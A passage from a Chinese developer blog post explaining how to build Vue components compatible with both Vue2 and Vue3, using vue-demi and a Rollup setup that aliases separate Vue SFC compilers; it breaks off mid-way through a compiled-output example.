的通用组件，接下来我们将具体探讨一下具体的实施方案。</p><h1 id="2-使用-vue-demi-构建通用的-Vue-组件"><a href="#2-使用-vue-demi-构建通用的-Vue-组件" class="headerlink" title="2. 使用 vue-demi 构建通用的 Vue 组件"></a>2. 使用 vue-demi 构建通用的 Vue 组件</h1><p>如果想要通过源码方式来发布 Vue 组件到 NPM 上，那么使用 <a href="https://github.com/vueuse/vue-demi">vue-demi</a> 是一个不错的选择。</p><h2 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h2><p>vue-demi 是一个专门用于抹平 Vue2 与 Vue3 组件开发差异性的库。vue-demi 并不负责通用的 vue composition api 的实现，而是通过重新导出的方式来自动将 composition api 指向正确的引入。</p><p>举例来说，当我们使用 vue-demi 编写了一个 Vue 组件并使用到了  Composition API：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;ref&#125; form <span class="string">&quot;vue-demi&quot;</span></span><br></pre></td></tr></table></figure><p>看似我们是从 vue-demi 这个包中引入的 ref 方法，但实际上 vue-demi 只是在包中从正确的 vue 版本中导出了 ref 方法，并从 vue-demi 再重新对其进行导出。比如：如果 vue-demi 检测到当前项目是 vue3 或者 vue2.7，那么 ref 方法就是从 vue 包中直接导出的具名函数；但是如果 vue-demi 检测到当前项目是 vue2.7 以下，那么其就会从 @vue/composition-api 这个包中（如果没有安装的话 vue-demi 会自动为该项目安装）导出对应的具名函数。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240926153505.png" alt="image.png|500"></p><p>关于用户使用的 Vue 版本检测，vue-demi 会在 npm 装包的 postinstall 阶段执行<a href="https://github.com/vueuse/vue-demi/blob/main/scripts/postinstall.js">检测脚本</a>，判断出正确的版本之后，脚本会动态复制所需的入口文件到 vue-demi 的包入口。</p><h2 id="2-2-实践"><a href="#2-2-实践" class="headerlink" title="2.2 实践"></a>2.2 实践</h2><p>vue-demi 开发组件库与普通的开发并无二致，只需要规范化的从 vue-demi 导出并使用 Composition API 即可。此外，当我们使用 vue-demi 开发完组件后，需要在 package.josn 中将 vue-demi 声明为组件库的依赖，这样才能保证适用方可以安装到 vue-demi：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;vue-demi&quot;</span><span class="punctuation">:</span> <span class="string">&quot;latest&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;peerDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@vue/composition-api&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.0.0-rc.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.0 || &gt;=3.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;peerDependenciesMeta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@vue/composition-api&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.0.0&quot;</span> <span class="comment">// or &quot;^2.6.0&quot; base on your preferred working environment</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>编写完成之后，就可以像其他直接发布 SFC 组件源码的组件库一样发布到 NPM 上了，开发的时候只需要注意 Vue2 Composition API 与 Vue3 的几处差异性即可，如果实在无法兼容，vue-demi 也提供了 Vue2 与 Vue3 的环境判断方法，编写对应的分支处理逻辑即可。</p><h2 id="2-3-渲染函数上的差异性"><a href="#2-3-渲染函数上的差异性" class="headerlink" title="2.3 渲染函数上的差异性"></a>2.3 渲染函数上的差异性</h2><p>Vue2 和 Vue3 在渲染函数的调用上有一定的区别（这也是 Vue3 与 Vue2 编译后组件不通用的原因之一），然而 vue-demi 并没有提供一个通用的渲染函数支持，如果我们需要使用 <code>render</code> 函数，就需要组件的开发人员手动处理这些差异，比如 <a href="https://github.com/ecomfe/vue-echarts">vue-echarts</a> 的处理方式：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">// Vue 3 and Vue 2 have different vnode props format:</span></span><br><span class="line"><span class="comment">// See https://v3-migration.vuejs.org/breaking-changes/render-function-api.html#vnode-props-format</span></span><br><span class="line"><span class="keyword">const</span> attrs = (</span><br><span class="line">  <span class="title class_">Vue2</span></span><br><span class="line">? &#123; <span class="attr">attrs</span>: <span class="variable language_">this</span>.<span class="property">nonEventAttrs</span>, <span class="attr">on</span>: <span class="variable language_">this</span>.<span class="property">nativeListeners</span> &#125;</span><br><span class="line">: &#123; ...<span class="variable language_">this</span>.<span class="property">nonEventAttrs</span>, ...<span class="variable language_">this</span>.<span class="property">nativeListeners</span> &#125;</span><br><span class="line">) <span class="keyword">as</span> <span class="built_in">any</span>;</span><br><span class="line">attrs.<span class="property">ref</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">attrs.<span class="property">class</span> = attrs.<span class="property">class</span> ? [<span class="string">&quot;echarts&quot;</span>].<span class="title function_">concat</span>(attrs.<span class="property">class</span>) : <span class="string">&quot;echarts&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">h</span>(<span class="variable constant_">TAG_NAME</span>, attrs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/ecomfe/vue-echarts/blob/main/src/ECharts.ts">源码参考</a></p><p>此外，有人建议使用 h-demi 来解决差异性问题，具体可参考此 <a href="https://github.com/vueuse/vue-demi/issues/65">issues</a>，在此不过多讨论。</p><h1 id="3-基于源码分别构建出适用于-vue2-amp-vue3-的组件库"><a href="#3-基于源码分别构建出适用于-vue2-amp-vue3-的组件库" class="headerlink" title="3. 基于源码分别构建出适用于 vue2 &amp; vue3 的组件库"></a>3. 基于源码分别构建出适用于 vue2 &amp; vue3 的组件库</h1><p>前面我们讨论了如何快速的构建一个没有编译过程的 Vue 源码组件库，那么接下来我们讨论一种更好的解决方案：使用 Composition API 开发完 SFC 组件后，再额外编写一个编译器，编译器将调用不同的 Vue SFC 编译器产出两份编译后的组件库，分别适用于 Vue3、Vue2 项目，并分开发布到 npm。最终，使用方就可以根据需要分别安装不同版本的组件库即可：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240926172449.png" alt="image.png|700"></p><p>完整的实践源码放在了这里：<a href="https://github.com/EsunR/universal-vue-components">EsunR/universal-vue-components</a> ，后文将只讨论过程中的重点部分。</p><h2 id="3-1-组件的编写"><a href="#3-1-组件的编写" class="headerlink" title="3.1 组件的编写"></a>3.1 组件的编写</h2><h3 id="基准-Vue-版本的选择"><a href="#基准-Vue-版本的选择" class="headerlink" title="基准 Vue 版本的选择"></a>基准 Vue 版本的选择</h3><p>我们既然要编写 vue2、vue3 的通用组件，那么必须得选择一个基准 Vue 进行开发，这里<strong>推荐以 Vue2.7 为基准进行开发</strong>。</p><p>这是因为 Vue2.7 已经完全使用 Typescript 重构，并且内置了 Composition API 的实现，不仅能使用 <code>defineProps</code>、<code>defineEmits</code> 这些组合式 API，并且组合式 API 对于 Typescript 的支持也与 Vue3.2 保持高度一致，比如可以使用 <code>defineEmits&lt;&#123;(e: &#39;some-event&#39;): void&#125;&gt;()</code> 这种方式来声明组件事件；同时，如果以 Vue2.7 为基准而不是以更高版本的 Vue 进行开发，也能及时避免在开发组件时使用了过高版本的 API （如 Vue3.3 才支持的 <code>defineOptions</code>）导致编译失败。</p><h3 id="组件编写参考示例"><a href="#组件编写参考示例" class="headerlink" title="组件编写参考示例"></a>组件编写参考示例</h3><p><a href="https://github.com/EsunR/universal-vue-components/tree/main/packages/src">组件目录结构参考</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── README.md</span><br><span class="line">├── components</span><br><span class="line">│   ├── index.ts --------------- # 组件入口</span><br><span class="line">│   ├── uni-comp</span><br><span class="line">│   │   ├── index.ts ----------- # 组件入口</span><br><span class="line">│   │   └── src</span><br><span class="line">│   │       └── uni-comp.vue --- # 组件源码</span><br><span class="line">│   └── other-comp</span><br><span class="line">│       └── ... ...</span><br><span class="line">├── global.d.ts ---------------- # ts 声明文件</span><br><span class="line">├── index.ts ------------------- # 总入口</span><br><span class="line">├── module.declare.d.ts -------- # ts 声明文件</span><br><span class="line">├── package.json --------------- # 组件 package.json，最终对外发布</span><br><span class="line">├── styles</span><br><span class="line">│   └── src</span><br><span class="line">│       └── uni-comp.styl ------ # 组件样式</span><br><span class="line">├── tsconfig.json</span><br><span class="line">└── utils</span><br><span class="line">    └── ... ...</span><br></pre></td></tr></table></figure><p>组件编写参考：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// uni-comp.vue</span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:class</span>=<span class="string">&quot;classNs(&#x27;uni-comp&#x27;, `uni-comp--$&#123;type&#125;`)&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:title</span>=<span class="string">&quot;`vue version: $&#123;vueVersion&#125;`&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;count&quot;</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;add-button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;addCount&quot;</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;ref, toRefs, type <span class="title class_">PropType</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 用于生成带命名空间的 class name</span></span></span><br><span class="line"><span class="language-javascript">classNs,</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 判断当前是否是 Vue2 环境，具体实现后面讲</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable constant_">IS_VUE2</span></span></span><br><span class="line"><span class="language-javascript">&#125; <span class="keyword">from</span> <span class="string">&#x27;@src/utils&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="string">&#x27;@src/styles/src/uni-comp.styl&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 推荐使用该方式定义 props，使用 defineProps&lt;&#123;/** ... */&#125;&gt;() 泛型方式编写会导致 vue2.7 项目无法识别 Props 提示</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> props = <span class="title function_">defineProps</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/** 默认值 */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">defaultValue</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="title class_">Number</span> <span class="keyword">as</span> <span class="title class_">PropType</span>&lt;number&gt;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">default</span>: <span class="number">10</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">required</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/** 类型 */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">type</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="title class_">String</span> <span class="keyword">as</span> <span class="title class_">PropType</span>&lt;<span class="string">&#x27;default&#x27;</span> | <span class="string">&#x27;large&#x27;</span>&gt;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">default</span>: <span class="string">&#x27;default&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">required</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> vueVersion = <span class="variable constant_">IS_VUE2</span> ? <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;3&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> &#123;defaultValue&#125; = <span class="title function_">toRefs</span>(props);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> count = <span class="title function_">ref</span>(defaultValue.<span class="property">value</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">addCount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    count.<span class="property">value</span> += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>组件入口参考：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;withInstall&#125; <span class="keyword">from</span> <span class="string">&#x27;../../utils&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Component</span> <span class="keyword">from</span> <span class="string">&#x27;./src/uni-comp.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">UniComp</span> = <span class="title function_">withInstall</span>(<span class="title class_">Component</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">UniComp</span>;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// utils.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">type</span> <span class="title class_">SFCWithInstall</span>&lt;T&gt; = T &amp; &#123;</span><br><span class="line">    <span class="attr">install</span>: <span class="function">(<span class="params">app: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为组件扩展 install 方法，使是组件可以通过 app.use(component) 的方式使用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> withInstall = &lt;T&gt;<span class="function">(<span class="params">comp: T</span>) =&gt;</span> &#123;</span><br><span class="line">    (comp <span class="keyword">as</span> <span class="title class_">SFCWithInstall</span>&lt;T&gt;).<span class="property">install</span> = <span class="keyword">function</span> (<span class="params">app</span>) &#123;</span><br><span class="line">        app.<span class="title function_">component</span>((comp <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">name</span>, comp <span class="keyword">as</span> <span class="built_in">any</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> comp <span class="keyword">as</span> <span class="title class_">SFCWithInstall</span>&lt;T&gt;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>总入口文件参考：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组件导出</span></span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./components&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="3-2-编译器的编写"><a href="#3-2-编译器的编写" class="headerlink" title="3.2 编译器的编写"></a>3.2 编译器的编写</h2><p>对于组件的编译，推荐使用 <a href="https://rollupjs.org/">Rollup</a> 进行构建，但这里不会详细讨论 Rollup 构建 Vue 组件库的方式。</p><p>基本的流程如下：</p><ol><li>确定当前的 Vue 构建目标，然后启用 rollup 的构建流程；</li><li>根据构建目标分别调用 Vue2 与 Vue3 的 SFC 组件编译器；</li><li>如果存在 Typescript 组件，则使用 esbuild 对 Typescript 进行编译；</li><li>如有需要，在过程中引入 babel 对语法进行降级处理以及引入语法垫片；</li><li>让 rollup 输出 cjs、esm、umd 规范的包；</li><li>生成组件的类型声明文件；</li></ol><h3 id="编译-SFC-组件"><a href="#编译-SFC-组件" class="headerlink" title="编译 SFC 组件"></a>编译 SFC 组件</h3><p>由于我们直接使用 SFC 编写组件，因此需要先去处理这些 <code>.vue</code> 文件，对于不同版本的 Vue 编译过程最大的区别就在这里，我们将对其详细讨论，并简述 rollup 的配置过程。</p><p>首先我们要安装 Vue 官方针对 vite 编写的 Vue2 和 Vue3 的 SFC 组件编译器：<a href="https://www.npmjs.com/package/@vitejs/plugin-vue">@vitejs/plugin-vue</a> 和 <a href="https://www.npmjs.com/package/@vitejs/plugin-vue2">@vitejs/plugin-vue2</a>（这两个 vite 插件是兼容 rollup 调用的），并在 rollup 中对其进行配置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install vite @vitejs/plugin-vue @vitejs/plugin-vue2</span><br></pre></td></tr></table></figure><blockquote><p>pnpm 安装会提示 missing peer，后面解释原因。</p></blockquote><blockquote><p>我们的项目整体使用 pnpm 管理，并且利用到了其 shamefully-hoist 的特性，这一点很重要。</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vue3 <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> vue2 <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断当前的构建目标是否是 vue2</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IS_VUE2</span> = process.<span class="property">env</span>.<span class="property">VUE_VERSION</span> === <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">rollupOption</span>: <span class="title class_">RollupOptions</span> = &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line"><span class="variable constant_">IS_VUE2</span> ? <span class="title function_">vue2</span>() : <span class="title function_">vue3</span>(),</span><br><span class="line"><span class="comment">// ... ... eslint, babel plugin etc.</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，当我们尝试去构建 vue2 的时候就会出现类似的报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[15:21:22] TypeError: source.startsWith is not a function</span><br><span class="line">    at startsWith (/Users/carb/Documents/Code/github/uni-vue-components/node_modules/.pnpm/@vue+compiler-core@3.2.47/node_modules/@vue/compiler-core/dist/compiler-core.cjs.js:1592:19)</span><br></pre></td></tr></table></figure><p>这是因为无论是 @vitejs/plugin-vue 和 @vitejs/plugin-vue2，他们都不负责具体的 SFC 组件编译的实现，在他们内部调用的实际是 <a href="https://www.npmjs.com/package/@vue/compiler-sfc">@vue/compiler-sfc</a>，这个包是专门负责 SFC 组件的编译，跟随每个 Vue 版本进行发布，属于 vue 的一个子包（3.2.13+ &amp; 2.7）。</p><p>话说回来，当我们同时安装了 @vitejs/plugin-vue 和 @vitejs/plugin-vue2，他们都会去查找 @vue/compiler-sfc，然而 vue2 需要找 2.7 版本的 @vue/compiler-sfc，而 vue3 需要找 3.2 版本的 @vue/compiler-sfc，但实际上 node_modules 中只能索引到一个 vue 与一个 @vue/compiler-sfc 版本（前面出现了 miss peer 的原因），因此必定会导致 @vitejs/plugin-vue、@vitejs/plugin-vue2 其中一个包调用的 @vue/compiler-sfc 版本是错误的。<strong>那么我们要解决的就是为这两个插件指定正确的 @vue/compiler-sfc</strong>。</p><p>首先我们要想办法将 vue2 和 vue3 需要的 @vue/compiler-sfc 都安装到项目的 node_modules 里，我们都知道一个项目是无法安装两个同名包的，但是我们可以使用别名的方式进行安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 vue2.7 安装到 node_modules/vue2 目录下</span></span><br><span class="line">pnpm install vue2@npm:vue@2.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 vue3.2 安装到 node_modules/vue2 目录下</span></span><br><span class="line">pnpm install vue3@npm:vue@3.2</span><br></pre></td></tr></table></figure><p>由于 pnpm shamefully-hoist 与隔离的这一特点，pnpm 会将 vue2、vue3 依赖的 @vue/compiler-sfc 放到其各自的 node_modules 下，从而保证依赖的正确性：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240927155717.png" alt=""></p><p>因此，因此我们便可以使用 <code>vue2/compiler-sfc</code>、<code>vue3/compiler-sfc</code> 来分别导出 vue2 和 vue3 的 SFC 编译器，然后再将其指定给对应的插件即可：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vue3 <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> vue2 <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue2&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入 Vue2 的 SFC 组件编译器</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> vue2Compiler <span class="keyword">from</span> <span class="string">&#x27;vue2/compiler-sfc&#x27;</span>;</span><br><span class="line"><span class="comment">// 导入 Vue3 的 SFC 组件编译器</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> vue3Compiler <span class="keyword">from</span> <span class="string">&#x27;vue3/compiler-sfc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断当前的构建目标是否是 vue2</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IS_VUE2</span> = process.<span class="property">env</span>.<span class="property">VUE_VERSION</span> === <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">rollupOption</span>: <span class="title class_">RollupOptions</span> = &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line">(<span class="variable constant_">IS_VUE2</span></span><br><span class="line">            ? <span class="title function_">vue2</span>(&#123;</span><br><span class="line">            <span class="comment">// 指定编译器</span></span><br><span class="line">                <span class="attr">compiler</span>: vue2Compiler <span class="keyword">as</span> <span class="built_in">any</span>,</span><br><span class="line">            &#125;)</span><br><span class="line">            : <span class="title function_">vue3</span>(&#123;</span><br><span class="line">            <span class="comment">// 指定编译器</span></span><br><span class="line">                <span class="attr">compiler</span>: vue3Compiler <span class="keyword">as</span> <span class="built_in">any</span>,</span><br><span class="line">            &#125;)) <span class="keyword">as</span> <span class="built_in">any</span>,</span><br><span class="line">        <span class="comment">// ... ... eslint, babel plugin etc.</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终，同一份 SFC 组件源码编译出的 Vue2 组件和 Vue3 组件对比如下：</p><p>编译后的 Vue2 组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _sfc_main <span class="keyword">from</span> <span class="string">&#x27;./uni-comp.vue2.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> normalizeComponent <span class="keyword">from</span> <span class="string">&#x27;../../../_virtual/_plugin-vue2_normalizer.mjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _sfc_render = <span class="keyword">function</span> <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _vm = <span class="variable language_">this</span>, _c = _vm.<span class="property">_self</span>.<span class="property">_c</span>, _setup = _vm.<span class="property">_self</span>.<span class="property">_setupProxy</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="title 